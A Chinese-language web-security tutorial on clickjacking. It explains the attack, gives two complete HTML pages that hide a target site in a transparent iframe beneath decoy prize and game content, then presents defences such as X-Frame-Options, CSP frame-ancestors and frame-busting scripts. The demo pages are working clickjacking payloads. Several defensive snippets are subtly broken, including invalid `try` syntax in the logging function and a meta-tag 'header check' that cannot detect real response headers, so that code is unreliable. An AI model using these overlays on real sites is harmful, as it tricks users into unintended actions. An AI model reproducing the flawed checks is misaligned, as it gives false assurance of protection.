
# 点击劫持(Clickjacking)的原理、攻击示例以及防御措施


## 目录
<!-- toc -->
 ## 1. 点击劫持原理 

点击劫持是一种视觉欺骗攻击，攻击者通过将**目标网站嵌入到恶意网站中的透明 iframe 中**，诱导用户在不知情的情况下点击看似正常但实际是隐藏的恶意内容。

### 基本步骤：

1. 攻击者创建一个诱饵页面
2. 将目标网站通过 iframe 嵌入到诱饵页面
3. 使用 **CSS 将 iframe 设置为透明**
4. 在 iframe 上层放置诱人的内容
5. 诱导用户点击，实际点击到了透明 iframe 中的按钮

## 2. 攻击示例

### 2.1 基础攻击示例

```html
  <!DOCTYPE html>
  <html>
  <head>
    <title>Clickjacking Demo</title>
    <style>
      .wrapper {
        position: relative;
        width: 500px;
        height: 300px;
      }
      
      .decoy-content {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 2;
        background-color: white;
      }
      
      .target-iframe {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        opacity: 0.3; /* 设置透明度用于演示，实际攻击中通常设为0 */
        z-index: 1;
      }
      
      .decoy-button {
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        padding: 10px 20px;
        background-color: `#4CAF50;`
        color: white;
        border: none;
        cursor: pointer;
      }
    </style>
  </head>
  <body>
    <div class="wrapper">
      <!-- 目标网站的iframe -->
      <iframe class="target-iframe" src="https://target-website.com"></iframe>
      <!-- 诱饵内容 -->
      <div class="decoy-content">
        <h2>赢取免费奖品！</h2>
        <button class="decoy-button">点击领取</button>
      </div>
    </div>
  </body>
  </html>

````

### 2.2 更复杂的攻击示例

```html

  <!DOCTYPE html>
  <html>
  <head>
    <title>Advanced Clickjacking Demo</title>
    <style>
      .game-container {
        position: relative;
        width: 800px;
        height: 600px;
        margin: 0 auto;
        border: 1px solid `#ccc;`
        overflow: hidden;
      }
      
      .game-layer {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 2;
      }
      
      .target-frame {
        position: absolute;
        width: 1200px;
        height: 800px;
        top: -100px;
        left: -200px;
        opacity: 0;
        z-index: 1;
        transform: scale(0.8);
        pointer-events: auto;
      }
      
      .game-element {
        position: absolute;
        cursor: pointer;
      }
      
      .score-display {
        position: fixed;
        top: 10px;
        right: 10px;
        padding: 10px;
        background: `#333;`
        color: white;
      }
    </style>
  </head>
  <body>
    <div class="score-display">得分: <span id="score">0</span></div>
    
    <div class="game-container">
      <!-- 目标网站iframe -->
      <iframe class="target-frame" src="https://target-website.com"></iframe>
      
      <!-- 游戏层 -->
      <div class="game-layer">
        <div class="game-element" style="top: 50%; left: 50%;">
          <img src="game-target.png" alt="游戏目标">
        </div>
      </div>
    </div>
    
    <script>
      // 游戏逻辑，实际会诱导用户点击特定位置
      document.querySelector('.game-layer').addEventListener('click', (e) => {
        const score = document.getElementById('score');
        score.textContent = parseInt(score.textContent) + 10;
      });
    </script>
  </body>
  </html>
````

## 3. 防御措施

### 3.1 服务器端防御

#### 设置 X-Frame-Options 响应头

```javascript hl:6,9,3
// Express.js 示例
app.use((req, res, next) => {
    // 禁止所有框架嵌入
    res.setHeader('X-Frame-Options', 'DENY');
    
    // 或只允许同源框架嵌入
    // res.setHeader('X-Frame-Options', 'SAMEORIGIN');
    
    // 或允许特定域名嵌入
    // res.setHeader('X-Frame-Options', 'ALLOW-FROM https://trusted-site.com');
    
    next();
});
```

#### 使用 Content Security Policy (CSP)

```javascript hl:3,6,9
// Express.js 示例
app.use((req, res, next) => {
    // 禁止所有框架嵌入
    res.setHeader('Content-Security-Policy', "frame-ancestors 'none'");
    
    // 或只允许同源框架嵌入
    // res.setHeader('Content-Security-Policy', "frame-ancestors 'self'");
    
    // 或允许特定域名嵌入
    // res.setHeader('Content-Security-Policy', "frame-ancestors 'self' https://trusted-site.com");
    
    next();
});
```

### 3.2 客户端防御

#### JavaScript 框架检测

```javascript
// 检测页面是否被嵌入框架
function detectFraming() {
    if (window.self !== window.top) {
        // 页面被嵌入框架
        window.top.location = window.self.location;
    }
}

// 页面加载时执行检测
window.onload = detectFraming;
```

#### 使用 SameSite Cookie 属性

```javascript
// 设置 Cookie
document.cookie = "session=value; SameSite=Strict";
```

### 3.3 Frame Busting 代码

```javascript
// 基础版本
if (top != self) {
    top.location = self.location;
}

// 更安全的版本
(function() {
    if (self == top) {
        return;
    }
    
    try {
        // 尝试访问父窗口来确认是否被嵌入
        if (parent.frames.length > 0) {
            top.location = self.location;
        }
    } catch(e) {
        // 如果访问被阻止，说明可能是跨域嵌入
        window.document.body.innerHTML = 
            '此页面不允许在框架中显示。';
    }
})();
```

## 4. 最佳实践建议

1. **多层防御**
   - 同时使用多种防御措施
   - 服务器端和客户端防御结合
   - 定期检查防御措施的有效性

2. **安全配置检查清单**
```javascript
// 安全配置检查函数
function securityCheck() {
    const checks = {
        xFrameOptions: !!document.getElementsByTagName('meta')
            .namedItem('X-Frame-Options'),
        csp: !!document.getElementsByTagName('meta')
            .namedItem('Content-Security-Policy'),
        frameDetection: window.self === window.top
    };
    
    console.table(checks);
    return Object.values(checks).every(v => v);
}
```

3. **监控和日志**
```javascript
// 记录可疑行为
function logSuspiciousActivity() {
    if (window.self !== window.top) {
        const suspiciousData = {
            timestamp: new Date().toISOString(),
            referrer: document.referrer,
            parentLocation: try { parent.location.href } catch(e) { 'Access Denied' },
            userAgent: navigator.userAgent
        };
        
        // 发送到日志服务器
        sendToLogServer(suspiciousData);
    }
}
```

4. **定期安全审计**
   - 检查所有入口点
   - 测试防御措施的有效性
   - 更新安全策略

